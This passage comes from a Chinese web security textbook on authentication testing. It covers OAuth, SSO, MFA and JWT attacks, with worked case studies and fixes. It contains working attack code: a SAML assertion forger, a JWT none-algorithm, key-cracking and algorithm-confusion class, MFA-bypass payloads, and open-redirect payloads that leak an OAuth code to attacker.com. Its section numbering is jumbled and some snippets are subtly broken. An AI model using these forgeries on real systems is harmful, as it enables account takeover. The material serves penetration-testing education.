                print(f"[!] OAuth开放重定向: {redirect}")
    
    # 测试State参数
    params_no_state = {
        "response_type": "code",
        "client_id": client_id,
        "redirect_uri": "https://app.example.com/callback"
    }
    
    response = requests.get(auth_url, params=params_no_state)
    if response.status_code == 200:
        print("[!] OAuth State参数缺失")

# 使用示例
test_oauth_security("https://auth.example.com/authorize", "client123")
```

### 12.4.5 SSO单点登录漏洞

**SSO概述：**

单点登录（SSO）允许用户通过一次认证访问多个应用系统。常见的SSO协议包括SAML、OAuth 2.0、OpenID Connect等。

**常见SSO漏洞：**

| 漏洞类型 | 原理 | 严重程度 |
|----------|------|----------|
| SAML断言注入 | 伪造SAML断言获取权限 | 高 |
| 会话同步缺陷 | 多个系统会话不同步 | 中 |
| 注销不完整 | 注销后其他系统仍登录 | 中 |
| 认证绕过 | 绕过SSO直接访问资源 | 高 |
| 证书验证缺失 | 未验证SAML签名证书 | 高 |

**1. SAML断言注入**

```python
import base64

def forge_saml_assertion(username, role):
    """伪造SAML断言"""
    saml_template = f"""<?xml version="1.0" encoding="UTF-8"?>
<saml2:Assertion xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion" 
                 ID="ID_{username}" 
                 IssueInstant="2024-01-01T00:00:00Z" 
                 Version="2.0">
    <saml2:Issuer Format="urn:oasis:names:tc:SAML:2.0:nameid-format:entity">
        https://attacker.com/idp
    </saml2:Issuer>
    <saml2:Subject>
        <saml2:NameID Format="urn:oasis:names:tc:SAML:2.0:nameid-format:persistent">
            {username}
        </saml2:NameID>
        <saml2:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
            <saml2:SubjectConfirmationData NotOnOrAfter="2099-12-31T23:59:59Z" 
                                           Recipient="https://target.example.com/saml/acs"/>
        </saml2:SubjectConfirmation>
    </saml2:Subject>
    <saml2:Conditions NotBefore="2024-01-01T00:00:00Z" 
                      NotOnOrAfter="2099-12-31T23:59:59Z">
        <saml2:AudienceRestriction>
            <saml2:Audience>https://target.example.com</saml2:Audience>
        </saml2:AudienceRestriction>
    </saml2:Conditions>
    <saml2:AttributeStatement>
        <saml2:Attribute Name="role">
            <saml2:AttributeValue>{role}</saml2:AttributeValue>
        </saml2:Attribute>
    </saml2:AttributeStatement>
</saml2:Assertion>"""
    
    # 编码为Base64
    encoded = base64.b64encode(saml_template.encode()).decode()
    
    # URL编码
    import urllib.parse
    url_encoded = urllib.parse.quote(encoded)
    
    return url_encoded

# 使用示例
saml_assertion = forge_saml_assertion("admin", "administrator")
print(f"SAML断言: {saml_assertion}")
```

**2. 会话同步漏洞**

```python
import requests

def test_session_sync(target_url):
    """测试会话同步漏洞"""
    session1 = requests.Session()
    session2 = requests.Session()
    
    # 在系统A登录
    login_data = {"username": "test", "password": "test"}
    session1.post(f"{target_url}/system-a/login", data=login_data)
    
    # 获取系统A的Session
    session_a_cookie = session1.cookies.get('session')
    print(f"[*] 系统A Session: {session_a_cookie}")
    
    # 在系统B使用相同Session
    session2.cookies.set('session', session_a_cookie)
    response = session2.get(f"{target_url}/system-b/account")
    
    if response.status_code == 200 and "test" in response.text:
        print("[!] 会话同步漏洞：系统B接受系统A的Session")
        return True
    
    return False

# 使用示例
test_session_sync("https://sso.example.com")
```

**3. 注销不完整测试**

```python
def test_logout_incomplete(target_url, credentials):
    """测试注销不完整"""
    session = requests.Session()
    
    # 登录
    session.post(f"{target_url}/login", data=credentials)
    
    # 获取多个系统的Cookie
    cookies_before = dict(session.cookies)
    print(f"[*] 注销前Cookie数量: {len(cookies_before)}")
    
    # 执行注销
    session.get(f"{target_url}/logout")
    
    # 检查Cookie是否全部清除
    cookies_after = dict(session.cookies)
    print(f"[*] 注销后Cookie数量: {len(cookies_after)}")
    
    # 尝试访问受保护资源
    response = session.get(f"{target_url}/api/users")
    
    if response.status_code == 200:
        print("[!] 注销不完整：仍可访问受保护资源")
        return True
    
    return False

# 使用示例
test_logout_incomplete("https://sso.example.com", {"username": "test", "password": "test"})
```

### 12.4.6 认证绕过高级技巧

**1. Token窃取与重放**

```python
import requests
import time

def test_token_replay(url, valid_token):
    """测试Token重放攻击"""
    # 首次使用Token
    headers = {"Authorization": f"Bearer {valid_token}"}
    response1 = requests.get(f"{url}/api/users", headers=headers)
    print(f"[*] 首次请求: {response1.status_code}")
    
    # 等待一段时间后重放
    time.sleep(60)
    
    # 重放Token
    response2 = requests.get(f"{url}/api/users", headers=headers)
    print(f"[*] 重放请求: {response2.status_code}")
    
    if response2.status_code == 200:
        print("[!] Token重放成功：未实施一次性Token或时间戳验证")
        return True
    
    return False

# 使用示例
test_token_replay("https://api.example.com", valid_token)
```

**2. Cookie劫持测试**

```python
def test_cookie_hijacking(url, credentials):
    """测试Cookie安全性"""
    session = requests.Session()
    
    # 登录获取Cookie
    session.post(f"{url}/login", data=credentials)
    cookies = dict(session.cookies)
    
    # 检查Cookie属性
    cookie_headers = session.cookies.get_dict()
    
    print("[*] Cookie属性分析:")
    for cookie_name in cookies:
        print(f"    {cookie_name}:")
        
        # 检查HttpOnly
        if 'HttpOnly' not in str(session.cookies):
            print(f"      [!] 缺少HttpOnly属性")
        
        # 检查Secure
        if 'Secure' not in str(session.cookies):
            print(f"      [!] 缺少Secure属性")
        
        # 检查SameSite
        if 'SameSite' not in str(session.cookies):
            print(f"      [!] 缺少SameSite属性")
    
    return True

# 使用示例
test_cookie_hijacking("https://target.example.com", {"username": "test", "password": "test"})
```

**3. 多因素认证绕过**

```python
def test_mfa_bypass(url, credentials):
    """测试多因素认证绕过"""
    session = requests.Session()
    
    # 登录
    response = session.post(f"{url}/login", data=credentials)
    
    if response.status_code == 200:
        # 尝试直接访问受保护资源
        protected_response = session.get(f"{url}/api/protected")
        
        if protected_response.status_code == 200:
            print("[!] MFA绕过成功：无需验证即可访问")
            return True
    
    # 测试MFA验证端点
    mfa_payloads = [
        {"code": "000000"},
        {"code": "123456"},
        {"code": ""},
        {"code": None},
        {"mfa_bypass": True},
        {"skip_mfa": True},
        {"verified": True}
    ]
    
    for payload in mfa_payloads:
        response = session.post(f"{url}/verify-mfa", json=payload)
        
        if response.status_code == 200:
            print(f"[!] MFA绕过成功: {payload}")
            return True
    
    return False

# 使用示例
test_mfa_bypass("https://target.example.com", {"username": "test", "password": "test"})
```

## 12.5 JWT安全测试工具

### 12.5.1 jwt_tool

jwt_tool是一个功能强大的JWT安全测试工具。

**安装：**

```bash
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool
pip install pycryptodome
python jwt_tool.py
```

**常用功能：**

```bash
# 解码JWT
python jwt_tool.py <JWT>

# 测试none算法
python jwt_tool.py <JWT> -X a

# 测试算法混淆（需要公钥）
python jwt_tool.py <JWT> -X k -pk public_key.pem

# 爆破密钥
python jwt_tool.py <JWT> -C -d wordlist.txt

# 伪造JWT（已知密钥）
python jwt_tool.py <JWT> -S hs256 -k "secret" -I

# 修改Payload
python jwt_tool.py <JWT> -T
```

### 12.5.2 JWT Debugger

JWT Debugger是一个在线JWT调试工具。

**使用方法：**

1. 访问 https://jwt.io/
2. 输入JWT Token
3. 查看解码后的Header和Payload
4. 可修改Payload并重新签名

**注意事项：**

- 仅用于调试，不要在生产环境使用
- 不要泄露真实Token
- 注意密钥安全性

### 12.4.3 Burp Suite JWT插件

**JWT4B插件：**

```bash
# 安装
# 从BApp Store安装JWT4B

# 功能
# 1. 自动解码JWT
# 2. 编辑JWT Payload
# 3. 重新签名JWT
# 4. 发送修改后的请求
```

**使用流程：**

1. 捕获包含JWT的请求
2. 在JWT4B面板查看解码内容
3. 编辑Payload（如修改role为admin）
4. 选择签名算法
5. 输入密钥或选择none算法
6. 发送修改后的请求

### 12.5.4 自定义Python脚本

**完整JWT测试脚本：**

```python
import base64
import json
import hmac
import hashlib
import requests
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.backends import default_backend

class JWTHacker:
    def __init__(self, token):
        self.token = token
        self.parts = token.split('.')
        self.header = self.decode_part(self.parts[0])
        self.payload = self.decode_part(self.parts[1])
    
    def decode_part(self, part):
        """解码JWT部分"""
        padding = len(part) % 4
        if padding:
            part += '=' * (4 - padding)
        return json.loads(base64.urlsafe_b64decode(part))
    
    def encode_part(self, data):
        """编码数据为JWT部分"""
        return base64.urlsafe_b64encode(json.dumps(data).encode()).decode().rstrip('=')
    
    def create_none_token(self, payload_modifications=None):
        """创建none算法Token"""
        header = {"alg": "none", "typ": "JWT"}
        payload = self.payload.copy()
        
        if payload_modifications:
            payload.update(payload_modifications)
        
        header_encoded = self.encode_part(header)
        payload_encoded = self.encode_part(payload)
        
        return f"{header_encoded}.{payload_encoded}."
    
    def create_hs256_token(self, secret, payload_modifications=None):
        """创建HS256签名Token"""
        header = {"alg": "HS256", "typ": "JWT"}
        payload = self.payload.copy()
        
        if payload_modifications:
            payload.update(payload_modifications)
        
        header_encoded = self.encode_part(header)
        payload_encoded = self.encode_part(payload)
        
        message = f"{header_encoded}.{payload_encoded}"
        signature = hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
        signature_encoded = base64.urlsafe_b64encode(signature).decode().rstrip('=')
        
        return f"{header_encoded}.{payload_encoded}.{signature_encoded}"
    
    def crack_secret(self, wordlist):
        """爆破密钥"""
        message = f"{self.parts[0]}.{self.parts[1]}"
        
        for secret in wordlist:
            signature = hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
            signature_encoded = base64.urlsafe_b64encode(signature).decode().rstrip('=')
            
            if signature_encoded == self.parts[2]:
                return secret
        
        return None
    
    def algorithm_confusion(self, public_key_pem):
        """算法混淆攻击"""
        header = {"alg": "HS256", "typ": "JWT"}
        header_encoded = self.encode_part(header)
        payload_encoded = self.encode_part(self.payload)
        
        message = f"{header_encoded}.{payload_encoded}"
        signature = hmac.new(public_key_pem.encode(), message.encode(), hashlib.sha256).digest()
        signature_encoded = base64.urlsafe_b64encode(signature).decode().rstrip('=')
        
        return f"{header_encoded}.{payload_encoded}.{signature_encoded}"

# 使用示例
hacker = JWTHacker("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...")

# 测试none算法
none_token = hacker.create_none_token({"role": "admin"})
print("None Token:", none_token)

# 爆破密钥
secret = hacker.crack_secret(["secret", "password", "123456"])
if secret:
    print(f"破解密钥: {secret}")
    
    # 伪造管理员Token
    admin_token = hacker.create_hs256_token(secret, {"role": "admin"})
    print("Admin Token:", admin_token)
```

## 12.6 实战案例

### 12.6.1 案例一：某电商平台JWT算法混淆漏洞

**目标描述：**

某电商平台使用JWT进行用户认证，采用RS256算法签名。攻击者发现存在算法混淆漏洞。

**漏洞发现过程：**

1. **获取JWT Token**

```http
POST /api/v1/login HTTP/1.1
Host: shop.example.com
Content-Type: application/json

{"username": "user", "password": "password"}

# 响应
{
    "token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...",
    "user": {"id": 1001, "role": "user"}
}
```

2. **解码JWT**

```python
import base64
import json

token = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9..."
parts = token.split('.')
header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))

print("Header:", header)  # {'alg': 'RS256', 'typ': 'JWT'}
print("Payload:", payload)  # {'sub': '1001', 'role': 'user', 'iat': 1516239022}
```

3. **获取公钥**

```http
GET /.well-known/jwks.json HTTP/1.1
Host: shop.example.com

# 响应
{
    "keys": [
        {
            "kty": "RSA",
            "use": "sig",
            "alg": "RS256",
            "n": "AMZx...",
            "e": "AQAB"
        }
    ]
}
```

4. **构造攻击Token**

```python
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend
import base64
import json
import hmac
import hashlib

# 从JWKS构造公钥
def construct_public_key(n, e):
    n_int = int.from_bytes(base64.urlsafe_b64decode(n + '=='), 'big')
    e_int = int.from_bytes(base64.urlsafe_b64decode(e + '=='), 'big')
    
    public_key = rsa.RSAPublicNumbers(e_int, n_int).public_key(default_backend())
    public_key_pem = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    ).decode()
    
    return public_key_pem

# 构造恶意Token
header = {"alg": "HS256", "typ": "JWT"}
payload = {"sub": "1001", "role": "admin", "iat": 1516239022}

header_encoded = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
payload_encoded = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')

message = f"{header_encoded}.{payload_encoded}"
signature = hmac.new(public_key_pem.encode(), message.encode(), hashlib.sha256).digest()
signature_encoded = base64.urlsafe_b64encode(signature).decode().rstrip('=')

malicious_token = f"{header_encoded}.{payload_encoded}.{signature_encoded}"
```

5. **验证攻击**

```http
GET /api/v1/admin/orders HTTP/1.1
Host: shop.example.com
Authorization: Bearer malicious_token

# 成功获取管理员数据
{
    "orders": [...],
    "users": [...]
}
```

**漏洞分析：**

- 服务端使用RS256签名，但未限制算法类型
- 当alg改为HS256时，服务端使用公钥验证HS256签名
- 公钥是公开的，攻击者可使用公钥伪造签名

**修复建议：**

```python
from flask_jwt_extended import JWTManager

jwt = JWTManager(app)

# 限制算法类型
@jwt.token_in_blacklist_loader
def check_if_token_revoked(decrypted_token):
    return False

# 配置
app.config['JWT_ALGORITHM'] = 'RS256'
app.config['JWT_DECODE_ALGORITHMS'] = ['RS256']  # 仅允许RS256
```

### 12.5.2 案例二：某社交平台JWT密钥爆破

**目标描述：**

某社交平台使用JWT认证，但使用了弱密钥，导致可被爆破。

**漏洞发现过程：**

1. **获取JWT**

```http
POST /api/v1/auth/login HTTP/1.1
Host: social.example.com
Content-Type: application/json

{"username": "user", "password": "password"}

# 响应
{
    "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1MTYyMzkwMjJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
}
```

2. **分析JWT**

```python
header = {'alg': 'HS256', 'typ': 'JWT'}
payload = {'sub': '1234567890', 'role': 'user', 'iat': 1516239022}
```

使用HS256算法，密钥可能较弱。

3. **爆破密钥**

```bash
# 使用jwt_tool
python jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9... -C -d rockyou.txt

# 输出
[*] Testing 1000 secrets...
[+] Secret found: "secret"
```

4. **伪造管理员Token**

```python
import base64
import json
import hmac
import hashlib

secret = "secret"

header = {"alg": "HS256", "typ": "JWT"}
payload = {"sub": "1234567890", "role": "admin", "iat": 1516239022}

header_encoded = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
payload_encoded = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')

message = f"{header_encoded}.{payload_encoded}"
signature = hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
signature_encoded = base64.urlsafe_b64encode(signature).decode().rstrip('=')

admin_token = f"{header_encoded}.{payload_encoded}.{signature_encoded}"
```

5. **验证攻击**

```http
GET /api/v1/admin/users HTTP/1.1
Host: social.example.com
Authorization: Bearer admin_token

# 成功获取用户列表
{
    "users": [
        {"id": 1, "username": "admin", "email": "admin@example.com"},
        {"id": 2, "username": "user1", "email": "user1@example.com"},
        ...
    ]
}
```

**漏洞分析：**

- 使用了弱密钥"secret"
- HS256算法依赖密钥强度
- 密钥可被字典爆破

**修复建议：**

```python
import secrets

# 生成强密钥
secret_key = secrets.token_hex(32)  # 256位密钥

app.config['JWT_SECRET_KEY'] = secret_key
```

### 12.5.3 案例三：某金融平台Session固定攻击

**目标描述：**

某金融平台存在Session固定漏洞，攻击者可劫持用户会话。

**漏洞发现过程：**

1. **获取初始Session**

```http
GET /login HTTP/1.1
Host: bank.example.com

# 响应
HTTP/1.1 200 OK
Set-Cookie: session=abc123def456; Path=/; HttpOnly
```

2. **诱导受害者**

```
攻击者发送链接给受害者：
https://bank.example.com/login?session=abc123def456

或通过其他方式设置Cookie：
<script>
document.cookie = "session=abc123def456; path=/; domain=bank.example.com";
</script>
```

3. **受害者登录**

```http
POST /login HTTP/1.1
Host: bank.example.com
Cookie: session=abc123def456
Content-Type: application/json

{"username": "victim", "password": "victim_password"}

# 响应
HTTP/1.1 200 OK
Content-Type: application/json

{"success": true, "message": "登录成功"}
# 注意：Session未更新
```

4. **攻击者访问**

```http
GET /account HTTP/1.1
Host: bank.example.com
Cookie: session=abc123def456

# 成功访问受害者账户
{
    "account_number": "1234567890",
    "balance": 100000.00,
    "transactions": [...]
}
```

**漏洞分析：**

- 登录后Session ID未更新
- Session与用户身份绑定，但ID不变
- 攻击者可使用预知的Session ID

**修复建议：**

```python
from flask import session
import secrets

@app.route('/login', methods=['POST'])
def login():
    user = authenticate(request.form['username'], request.form['password'])
    
    if user:
        # 清除旧Session
        session.clear()
        
        # 生成新Session ID
        session.sid = secrets.token_urlsafe(32)
        
        # 设置用户信息
        session['user_id'] = user.id
        session['authenticated'] = True
        
        return jsonify(success=True)
    
    return jsonify(error="认证失败"), 401
```

### 12.5.4 案例四：某企业系统JWT过期验证缺失

**目标描述：**

某企业内部系统使用JWT认证，但未正确验证Token过期时间。

**漏洞发现过程：**

1. **获取JWT**

```http
POST /api/auth/login HTTP/1.1
Host: enterprise.example.com
Content-Type: application/json

{"username": "employee", "password": "password"}

# 响应
{
    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImVtcGxveWVlIiwiaWF0IjoxNTE2MjM5MDIyLCJleHAiOjE1MTYyMzkwMjJ9.xxx"
}
```

2. **分析过期时间**

```python
import base64
import json
import time

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
payload = json.loads(base64.urlsafe_b64decode(token.split('.')[1] + '=='))

print("签发时间:", payload['iat'])  # 1516239022
print("过期时间:", payload['exp'])  # 1516239022 (与签发时间相同，已过期)
print("当前时间:", int(time.time()))  # 1516240000 (大于过期时间)
```

Token已过期。

3. **测试过期验证**

```http
GET /api/confidential/documents HTTP/1.1
Host: enterprise.example.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

# 成功获取机密文档
{
    "documents": [
        {"id": 1, "title": "财务报告", "content": "..."},
        {"id": 2, "title": "员工名单", "content": "..."}
    ]
}
```

使用过期Token仍可访问。

**漏洞分析：**

- 服务端未验证exp声明
- 过期Token仍被视为有效
- 用户退出后Token仍可用

**修复建议：**

```python
from flask_jwt_extended import jwt_required, get_jwt
import time

@app.route('/api/documents')
@jwt_required()
def get_documents():
    # 获取JWT声明
    claims = get_jwt()
    
    # 验证过期时间
    if 'exp' in claims:
        if time.time() > claims['exp']:
            return jsonify(error="Token已过期"), 401
    
    # 业务逻辑
    return jsonify(documents=get_documents())
```

### 12.6.5 案例五：某SaaS平台OAuth授权码泄露

**目标描述：**

某SaaS平台使用OAuth 2.0进行第三方登录，但存在授权码泄露漏洞，导致攻击者可获取用户账户权限。

**漏洞发现过程：**

1. **分析OAuth流程**

```http
# OAuth 2.0授权流程
GET /oauth/authorize?
    response_type=code&
    client_id=client123&
    redirect_uri=https://app.example.com/callback&
    scope=read+write&
    state=random_state

# 用户授权后重定向
HTTP/1.1 302 Found
Location: https://app.example.com/callback?code=authorization_code_xyz&state=random_state
```

2. **发现开放重定向漏洞**

```python
import requests

def test_open_redirect(auth_url, client_id):
    """测试OAuth开放重定向"""
    redirect_payloads = [
        "https://app.example.com/callback?url=https://evil.com",
        "https://app.example.com/callback/../evil.com",
        "https://app.example.com.evil.com/callback",
        "//evil.com/callback",
        "/\\evil.com/callback"
    ]
    
    for redirect_uri in redirect_payloads:
        params = {
            "response_type": "code",
            "client_id": client_id,
            "redirect_uri": redirect_uri,
            "scope": "read"
        }
        
        response = requests.get(auth_url, params=params, allow_redirects=False)
        
        if response.status_code == 302:
            location = response.headers.get("Location", "")
            if "evil.com" in location:
                print(f"[!] 开放重定向漏洞: {redirect_uri}")
                print(f"    Location: {location}")
                return location
    
    return None

# 使用示例
vulnerable_url = test_open_redirect("https://auth.example.com/oauth/authorize", "client123")
```

3. **构造恶意链接获取授权码**

```http
# 攻击者构造恶意链接
https://auth.example.com/oauth/authorize?
    response_type=code&
    client_id=client123&
    redirect_uri=https://app.example.com/callback?url=https://attacker.com&
    scope=read+write&
    state=attacker_state

# 用户点击链接并授权
# 重定向到攻击者服务器
HTTP/1.1 302 Found
Location: https://app.example.com/callback?url=https://attacker.com?code=SECRET_AUTH_CODE&state=attacker_state

# 攻击者服务器收到授权码
```

4. **使用授权码获取Token**

```http
POST /oauth/token HTTP/1.1
Host: auth.example.com
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&
code=SECRET_AUTH_CODE&
redirect_uri=https://app.example.com/callback&
client_id=client123&
client_secret=client_secret_xyz
```

5. **获取用户数据**

```http
GET /api/user HTTP/1.1
Host: api.example.com
Authorization: Bearer access_token

# 响应
{
    "id": 123,
    "username": "victim_user",
    "email": "victim@example.com",
    "role": "admin"
}
```

**漏洞分析：**

- OAuth重定向URL验证不足
- 未正确过滤重定向参数
- 授权码通过URL传递，可能被Referer或浏览器历史记录泄露

**修复建议：**

```python
def validate_redirect_uri(redirect_uri, client_id):
    """验证重定向URI"""
    # 获取客户端注册的重定向URI列表
    allowed_uris = get_allowed_redirect_uris(client_id)
    
    # 严格匹配
    if redirect_uri not in allowed_uris:
        raise ValueError("无效的重定向URI")
    
    # 检查是否为允许的域名
    parsed_uri = urlparse(redirect_uri)
    allowed_domains = ["app.example.com"]
    
    if parsed_uri.netloc not in allowed_domains:
        raise ValueError("不允许的重定向域名")
    
    return True

# 使用示例
validate_redirect_uri("https://app.example.com/callback", "client123")
```

## 12.7 JWT安全防护措施

### 12.7.1 安全配置

**JWT安全配置清单：**

| 配置项 | 安全建议 | 说明 |
|--------|----------|------|
| 算法选择 | 使用RS256或ES256 | 非对称算法更安全 |
| 密钥强度 | 至少256位 | 防止密钥爆破 |
| 过期时间 | 设置合理的exp | 通常1-24小时 |
| 刷新机制 | 使用Refresh Token | 长期会话管理 |
| Payload内容 | 不存储敏感信息 | 仅存储必要声明 |
| 传输方式 | Authorization头 | 避免URL参数 |
| HTTPS | 强制使用HTTPS | 防止中间人攻击 |

**安全配置示例：**

```python
from flask_jwt_extended import JWTManager

app.config['JWT_SECRET_KEY'] = secrets.token_hex(32)  # 强密钥
app.config['JWT_ALGORITHM'] = 'RS256'  # 使用非对称算法
app.config['JWT_ACCESS_TOKEN_EXPIRES'] = timedelta(hours=1)  # 1小时过期
app.config['JWT_REFRESH_TOKEN_EXPIRES'] = timedelta(days=30)  # 30天刷新
app.config['JWT_DECODE_ALGORITHMS'] = ['RS256']  # 仅允许RS256
app.config['JWT_BLACKLIST_ENABLED'] = True  # 启用黑名单
app.config['JWT_BLACKLIST_TOKEN_CHECKS'] = ['access', 'refresh']

jwt = JWTManager(app)
```

### 12.6.2 签名验证

**正确的签名验证：**

```python
import hmac
import hashlib
import base64
import json

def verify_jwt_signature(token, secret, algorithm='HS256'):
    """验证JWT签名"""
    parts = token.split('.')
    
    if len(parts) != 3:
        return False
    
    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
    
    # 检查算法
    if header['alg'] != algorithm:
        return False
    
    # 计算签名
    message = f"{parts[0]}.{parts[1]}"
    
    if algorithm == 'HS256':
        expected_sig = hmac.new(
            secret.encode(),
            message.encode(),
            hashlib.sha256
        ).digest()
    elif algorithm == 'HS384':
        expected_sig = hmac.new(
            secret.encode(),
            message.encode(),
            hashlib.sha384
        ).digest()
    elif algorithm == 'HS512':
        expected_sig = hmac.new(
            secret.encode(),
            message.encode(),
            hashlib.sha512
        ).digest()
    else:
        return False
    
    # 解码实际签名
    actual_sig = base64.urlsafe_b64decode(parts[2] + '==')
    
    # 使用安全的比较方法
    return hmac.compare_digest(expected_sig, actual_sig)
```

### 12.6.3 过期验证

```python
import time
import json
import base64

def verify_jwt_expiration(token):
    """验证JWT过期时间"""
    parts = token.split('.')
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
    
    # 检查exp声明
    if 'exp' not in payload:
        return False, "缺少过期时间"
    
    exp_time = payload['exp']
    current_time = int(time.time())
    
    if current_time > exp_time:
        return False, "Token已过期"
    
    # 检查nbf声明（可选）
    if 'nbf' in payload:
        if current_time < payload['nbf']:
            return False, "Token尚未生效"
    
    # 检查iat声明（可选）
    if 'iat' in payload:
        if payload['iat'] > current_time:
            return False, "签发时间无效"
    
    return True, "时间验证通过"
```

### 12.7.4 黑名单机制

```python
from datetime import datetime
import redis

# 使用Redis存储黑名单
redis_client = redis.Redis(host='localhost', port=6379, db=0)

def add_token_to_blacklist(token, expires_in):
    """将Token加入黑名单"""
    jti = get_token_jti(token)
    redis_client.setex(f"blacklist:{jti}", expires_in, "true")

def is_token_blacklisted(token):
    """检查Token是否在黑名单"""
    jti = get_token_jti(token)
    return redis_client.exists(f"blacklist:{jti}")

def get_token_jti(token):
    """获取Token的jti"""
    parts = token.split('.')
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
    return payload.get('jti')

@app.route('/logout', methods=['POST'])
@jwt_required()
def logout():
    token = get_jwt()
    jti = token['jti']
    exp = token['exp']
    
    # 计算剩余有效期
    expires_in = exp - int(time.time())
    
    # 加入黑名单
    add_token_to_blacklist(jti, expires_in)
    
    return jsonify(message="退出成功")
```

### 12.6.5 Token刷新机制

```python
from flask_jwt_extended import create_access_token, create_refresh_token, jwt_required, get_jwt_identity

@app.route('/login', methods=['POST'])
def login():
    user = authenticate(request.json['username'], request.json['password'])
    
    if user:
        # 创建Access Token和Refresh Token
        access_token = create_access_token(identity=user.id)
        refresh_token = create_refresh_token(identity=user.id)
        
        return jsonify(
            access_token=access_token,
            refresh_token=refresh_token
        )
    
    return jsonify(error="认证失败"), 401

@app.route('/refresh', methods=['POST'])
@jwt_required(refresh=True)
def refresh():
    """刷新Access Token"""
    current_user = get_jwt_identity()
    new_access_token = create_access_token(identity=current_user)
    
    return jsonify(access_token=new_access_token)
```

## 12.7 认证安全最佳实践

### 12.8.1 密码安全

**密码存储：**

```python
import bcrypt

def hash_password(password):
    """使用bcrypt哈希密码"""
    salt = bcrypt.gensalt(rounds=12)  # 工作因子12
    hashed = bcrypt.hashpw(password.encode(), salt)
    return hashed.decode()

def verify_password(password, hashed):
    """验证密码"""
    return bcrypt.checkpw(password.encode(), hashed.encode())

# 使用示例
hashed = hash_password("password123")
is_valid = verify_password("password123", hashed)
```

**密码策略：**

```python
import re

def validate_password(password):
    """验证密码强度"""
    errors = []
    
    if len(password) < 8:
        errors.append("密码长度至少8位")
    
    if len(password) > 128:
        errors.append("密码长度不超过128位")
    
    if not re.search(r'[A-Z]', password):
        errors.append("密码需包含大写字母")
    
    if not re.search(r'[a-z]', password):
        errors.append("密码需包含小写字母")
    
    if not re.search(r'[0-9]', password):
        errors.append("密码需包含数字")
    
    if not re.search(r'[!@#$%^&*(),.?":{}|<>]', password):
        errors.append("密码需包含特殊字符")
    
    # 检查常见弱密码
    weak_passwords = ['password', '123456', 'admin', 'qwerty']
    if password.lower() in weak_passwords:
        errors.append("密码过于常见")
    
    return len(errors) == 0, errors
```

### 12.8.2 多因素认证

**实现示例：**

```python
import pyotp
import qrcode

def generate_totp_secret(user_email):
    """生成TOTP密钥"""
    secret = pyotp.random_base32()
    totp = pyotp.TOTP(secret)
    
    # 生成QR码URL
    uri = totp.provisioning_uri(name=user_email, issuer_name="MyApp")
    
    return secret, uri

def verify_totp(secret, code):
    """验证TOTP码"""
    totp = pyotp.TOTP(secret)
    return totp.verify(code, valid_window=1)  # 允许前后1个时间窗口

# 使用示例
secret, uri = generate_totp_secret("user@example.com")
# 用户扫描QR码绑定

# 登录时验证
@app.route('/verify-mfa', methods=['POST'])
def verify_mfa():
    user = get_current_user()
    code = request.json['code']
    
    if verify_totp(user.totp_secret, code):
        session['mfa_verified'] = True
        return jsonify(success=True)
    
    return jsonify(error="验证码错误"), 401
```

### 12.8.3 登录安全

**防暴力破解：**

```python
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(app, key_func=get_remote_address)

@app.route('/login', methods=['POST'])
@limiter.limit("5 per minute")  # 每分钟最多5次
def login():
    username = request.json['username']
    password = request.json['password']
    
    # 检查账户锁定状态
    if is_account_locked(username):
        return jsonify(error="账户已锁定"), 403
    
    user = authenticate(username, password)
    
    if user:
        # 重置失败计数
        reset_login_attempts(username)
        
        # 生成Token
        token = create_access_token(identity=user.id)
        return jsonify(token=token)
    
    # 记录失败尝试
    record_login_failure(username)
    
    return jsonify(error="认证失败"), 401

def record_login_failure(username):
    """记录登录失败"""
    key = f"login_attempts:{username}"
    attempts = redis_client.incr(key)
    redis_client.expire(key, 3600)  # 1小时过期
    
    if attempts >= 5:
        lock_account(username)

def lock_account(username):
    """锁定账户"""
    key = f"account_locked:{username}"
    redis_client.setex(key, 3600, "true")  # 锁定1小时
```

**登录日志：**

```python
import logging
from datetime import datetime

logger = logging.getLogger('auth')

@app.route('/login', methods=['POST'])
def login():
    username = request.json['username']
    ip = request.remote_addr
    
    user = authenticate(username, request.json['password'])
    
    if user:
        logger.info({
            'event': 'login_success',
            'username': username,
            'ip': ip,
            'timestamp': datetime.utcnow().isoformat()
        })
        
        return jsonify(token=create_token(user))
    
    logger.warning({
        'event': 'login_failure',
        'username': username,
        'ip': ip,
        'timestamp': datetime.utcnow().isoformat()
    })
    
    return jsonify(error="认证失败"), 401
```

## 12.9 认证安全测试清单

### 12.9.1 JWT安全测试清单

